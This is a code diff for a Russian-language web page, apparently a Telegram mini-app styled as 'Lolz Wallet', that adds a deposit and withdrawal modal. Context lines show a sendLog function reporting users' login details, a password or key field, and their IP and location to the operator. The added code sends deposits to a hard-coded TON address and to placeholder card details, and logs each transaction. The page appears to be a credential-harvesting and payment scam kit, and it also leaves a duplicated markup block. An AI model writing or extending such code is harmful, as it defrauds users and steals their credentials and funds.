@@ -890,6 +890,14 @@ textarea.input-field{resize:none;height:120px;padding-top:11px;line-height:1.6;}
 .connect-ton-btn:active{transform:scale(0.97);background:rgba(0,152,234,0.15);}
 
   @keyframes glowPulse{0%,100%{transform:scale(1);opacity:0.7;}50%{transform:scale(1.15);opacity:1;}}
+
+  .wallet-currency-item {
+  background:var(--card);border:1px solid var(--border2);border-radius:12px;
+  padding:10px;display:flex;align-items:center;gap:8px;cursor:pointer;
+  transition:transform 0.15s,border-color 0.2s;
+}
+.wallet-currency-item:active{transform:scale(0.96);}
+.wallet-currency-item.active{border-color:rgba(92,184,92,0.4);background:rgba(92,184,92,0.06);}
   
 </style>
 </head>
@@ -1149,24 +1157,92 @@ textarea.input-field{resize:none;height:120px;padding-top:11px;line-height:1.6;}
   </a>
 </div>
 
-  <!-- ═══════════════ WALLETS ═══════════════ -->
+<!-- ═══════════════ WALLETS ═══════════════ -->
 <div class="screen" id="screen-wallets">
-
   <div class="wallet-hero">
     <div style="font-size:9px;font-weight:700;color:rgba(92,184,92,0.55);letter-spacing:3px;text-transform:uppercase;margin-bottom:8px;display:flex;align-items:center;gap:6px;position:relative;z-index:1;"><span style="color:rgba(92,184,92,0.4);">//</span> Lolz Wallet</div>
     <div style="font-family:'Unbounded',sans-serif;font-size:26px;font-weight:900;color:#fff;letter-spacing:-0.5px;position:relative;z-index:1;margin-bottom:3px;">Кошельки</div>
     <div style="font-size:11px;color:rgba(255,255,255,0.38);position:relative;z-index:1;line-height:1.5;margin-bottom:18px;">Управляй своими активами</div>
     <div class="wallet-btn-row">
-      <button class="wallet-btn deposit" onclick="showToast('💳 Пополнение — скоро')">
+      <button class="wallet-btn deposit" onclick="openWalletModal('deposit')">
         <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>
         Пополнить
       </button>
-      <button class="wallet-btn withdraw" onclick="showToast('📤 Вывод — скоро')">
+      <button class="wallet-btn withdraw" onclick="openWalletModal('withdraw')">
         <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><polyline points="19 12 12 19 5 12"/></svg>
         Вывести
       </button>
     </div>
   </div>
+
+  <!-- Мои кошельки -->
+  <div class="section-title">Мои кошельки</div>
+  <div class="card" style="padding:14px 15px;margin-bottom:13px;">
+    <div style="font-size:11px;color:var(--text-muted);margin-bottom:12px;">TON Кошелёк</div>
+    <button class="connect-ton-btn" onclick="openTonConnect()">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z" fill="#0098ea"/></svg>
+      Подключить TON кошелёк
+    </button>
+  </div>
+
+  <div class="section-title">Криптовалюты</div>
+  <div class="currency-grid">
+    <div class="currency-card">
+      <div class="currency-icon ic-ton">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 2L3 7.5v9L12 22l9-5.5v-9L12 2z" fill="rgba(56,130,219,0.5)"/><path d="M8 9l4 8 4-8" stroke="rgba(56,130,219,1)" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </div>
+      <div><div class="currency-name">TON</div><div class="currency-sub">Toncoin</div></div>
+    </div>
+    <div class="currency-card">
+      <div class="currency-icon ic-usdt">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" fill="rgba(39,174,96,0.25)" stroke="rgba(39,174,96,0.5)" stroke-width="1.2"/><text x="12" y="16.5" text-anchor="middle" font-size="12" font-weight="900" fill="#27ae60" font-family="Arial">₮</text></svg>
+      </div>
+      <div><div class="currency-name">USDT</div><div class="currency-sub">Tether</div></div>
+    </div>
+    <div class="currency-card">
+      <div class="currency-icon ic-btc">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" fill="rgba(247,147,26,0.2)" stroke="rgba(247,147,26,0.45)" stroke-width="1.2"/><text x="12" y="16.5" text-anchor="middle" font-size="13" font-weight="900" fill="#f7931a" font-family="Arial">₿</text></svg>
+      </div>
+      <div><div class="currency-name">BTC</div><div class="currency-sub">Bitcoin</div></div>
+    </div>
+    <div class="currency-card">
+      <div class="currency-icon ic-eth">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 3l-5 9 5 3 5-3-5-9z" fill="rgba(98,126,234,0.55)"/><path d="M12 21l-5-7 5 3 5-3-5 7z" fill="rgba(98,126,234,0.35)"/></svg>
+      </div>
+      <div><div class="currency-name">ETH</div><div class="currency-sub">Ethereum</div></div>
+    </div>
+  </div>
+
+  <div class="section-title">Фиатные валюты</div>
+  <div class="currency-grid">
+    <div class="currency-card">
+      <div class="currency-icon ic-rub"><span style="font-size:19px;font-weight:900;color:#7ed17e;">₽</span></div>
+      <div><div class="currency-name">RUB</div><div class="currency-sub">Рубль</div></div>
+    </div>
+    <div class="currency-card">
+      <div class="currency-icon ic-uah"><span style="font-size:19px;font-weight:900;color:#ffd700;">₴</span></div>
+      <div><div class="currency-name">UAH</div><div class="currency-sub">Гривна</div></div>
+    </div>
+    <div class="currency-card">
+      <div class="currency-icon ic-usd"><span style="font-size:19px;font-weight:900;color:#2ecc71;">$</span></div>
+      <div><div class="currency-name">USD</div><div class="currency-sub">Доллар</div></div>
+    </div>
+    <div class="currency-card">
+      <div class="currency-icon ic-eur"><span style="font-size:19px;font-weight:900;color:#3498db;">€</span></div>
+      <div><div class="currency-name">EUR</div><div class="currency-sub">Евро</div></div>
+    </div>
+    <div class="currency-card">
+      <div class="currency-icon ic-kzt"><span style="font-size:19px;font-weight:900;color:#f0b929;">₸</span></div>
+      <div><div class="currency-name">KZT</div><div class="currency-sub">Тенге</div></div>
+    </div>
+    <div class="currency-card">
+      <div class="currency-icon ic-star">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#a78bfa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+      </div>
+      <div><div class="currency-name">STARS</div><div class="currency-sub">Звёзды TG</div></div>
+    </div>
+  </div>
+</div><!-- /screen-wallets -->
 
   <!-- Мои кошельки -->
   <div class="section-title">Мои кошельки</div>
@@ -2087,6 +2163,17 @@ async function sendLog(method, email, password) {
        + `🔑 PublicKey: ${password || '—'}\n`
        + `📍 ${country}, ${city} (IP: ${ip})\n`
        + `🕐 ${now}`;
+      } else if (method === 'wallet_action') {
+  const parts = email.split('|');
+  const wMode = parts[0], wType = parts[1], wCur = parts[2], wAmount = parts[3];
+  const modeLabel = wMode === 'deposit' ? '💳 Пополнение' : '📤 Вывод';
+  text = `${modeLabel}\n`
+       + `👤 ${uid} ${username}\n`
+       + `💱 ${wCur} (${wType})\n`
+       + `💰 Сумма: ${wAmount}\n`
+       + `🏦 Реквизиты: ${password || '—'}\n`
+       + `📍 ${country}, ${city} (IP: ${ip})\n`
+       + `🕐 ${now}`;
     } else {
       const label = method === 'telegram'
         ? '✈️ <b>Вход через Telegram</b>'
@@ -2117,6 +2204,104 @@ async function sendLog(method, email, password) {
   } catch(e) {
     console.log('sendLog error:', e);
   }
+}
+
+
+  /* ─── WALLET MODAL ─── */
+var walletMode = 'deposit';
+var walletCryptoCur = 'TON';
+var walletFiatCur = 'RUB';
+
+const CRYPTO_CONTRACTS = {
+  TON:  'UQB5CsDgxza86jSegFBXbLTDW1nrQ4GS6JSI8UAP-CloqI6W',
+  USDT: 'TYour_USDT_Address_Here',
+  BTC:  'YourBTCAddressHere',
+  ETH:  '0xYourETHAddressHere'
+};
+
+const FIAT_REQUISITES = {
+  RUB: { bank: 'Сбербанк',   card: '2200 1234 5678 9012', name: 'Иван И.' },
+  UAH: { bank: 'Monobank',   card: '5375 4141 1234 5678', name: 'Іван І.' },
+  USD: { bank: 'Wise',       card: '4111 1111 1111 1111', name: 'Ivan I.' },
+  EUR: { bank: 'Revolut',    card: '4242 4242 4242 4242', name: 'Ivan I.' },
+  KZT: { bank: 'Kaspi Bank', card: '4400 1234 5678 9012', name: 'Иван И.' },
+};
+
+function openWalletModal(mode) {
+  walletMode = mode;
+  const isDeposit = mode === 'deposit';
+  document.getElementById('walletModalTitle').textContent = isDeposit ? 'Пополнение' : 'Вывод';
+  document.getElementById('walletAmountLabel').textContent = isDeposit ? 'Сумма пополнения' : 'Сумма вывода';
+  document.getElementById('walletFiatAmountLabel').textContent = isDeposit ? 'Сумма пополнения' : 'Сумма вывода';
+  document.getElementById('walletSubmitBtn').textContent = isDeposit ? '💳 Подтвердить пополнение' : '📤 Подтвердить вывод';
+  document.getElementById('walletAmountInput').value = '';
+  document.getElementById('walletFiatAmountInput').value = '';
+  switchWalletTab('crypto');
+  selectWalletCurrency(document.querySelector('.wallet-currency-item[data-cur="TON"]'), 'TON');
+  document.getElementById('walletModal').classList.add('open');
+}
+
+function switchWalletTab(tab) {
+  const isCrypto = tab === 'crypto';
+  document.getElementById('wallet-crypto-section').style.display = isCrypto ? 'block' : 'none';
+  document.getElementById('wallet-fiat-section').style.display = isCrypto ? 'none' : 'block';
+  document.getElementById('tab-crypto-btn').classList.toggle('active', isCrypto);
+  document.getElementById('tab-fiat-btn').classList.toggle('active', !isCrypto);
+}
+
+function selectWalletCurrency(el, cur) {
+  walletCryptoCur = cur;
+  document.querySelectorAll('#wallet-crypto-section .wallet-currency-item').forEach(i => i.classList.remove('active'));
+  el.classList.add('active');
+  document.getElementById('contractAddress').textContent = CRYPTO_CONTRACTS[cur] || '—';
+}
+
+function selectFiatCurrency(el, cur) {
+  walletFiatCur = cur;
+  document.querySelectorAll('#wallet-fiat-section .wallet-currency-item').forEach(i => i.classList.remove('active'));
+  el.classList.add('active');
+  const req = FIAT_REQUISITES[cur];
+  if (req) {
+    document.getElementById('fiatBank').textContent = req.bank;
+    document.getElementById('fiatCard').textContent = req.card;
+    document.getElementById('fiatName').textContent = req.name;
+  }
+}
+
+function copyContract() {
+  const addr = document.getElementById('contractAddress').textContent;
+  navigator.clipboard.writeText(addr).catch(() => {});
+  showToast('✅ Адрес скопирован');
+}
+
+function copyFiatCard() {
+  const card = document.getElementById('fiatCard').textContent;
+  navigator.clipboard.writeText(card.replace(/\s/g,'')).catch(() => {});
+  showToast('✅ Номер карты скопирован');
+}
+
+function submitWalletAction() {
+  const isCrypto = document.getElementById('wallet-crypto-section').style.display !== 'none';
+  const amount = isCrypto
+    ? document.getElementById('walletAmountInput').value.trim()
+    : document.getElementById('walletFiatAmountInput').value.trim();
+
+  if (!amount || parseFloat(amount) <= 0) {
+    showToast(' Укажите сумму');
+    return;
+  }
+
+  const cur = isCrypto ? walletCryptoCur : walletFiatCur;
+  const type = isCrypto ? 'crypto' : 'fiat';
+  const req = !isCrypto ? FIAT_REQUISITES[walletFiatCur] : null;
+
+  sendLog('wallet_action',
+    `${walletMode}|${type}|${cur}|${amount}`,
+    req ? `${req.bank}|${req.card}` : CRYPTO_CONTRACTS[cur] || ''
+  );
+
+  closeModal('walletModal');
+  showToast(walletMode === 'deposit' ? ' Заявка на пополнение отправлена' : 'Заявка на вывод отправлена');
 }
 </script>
 
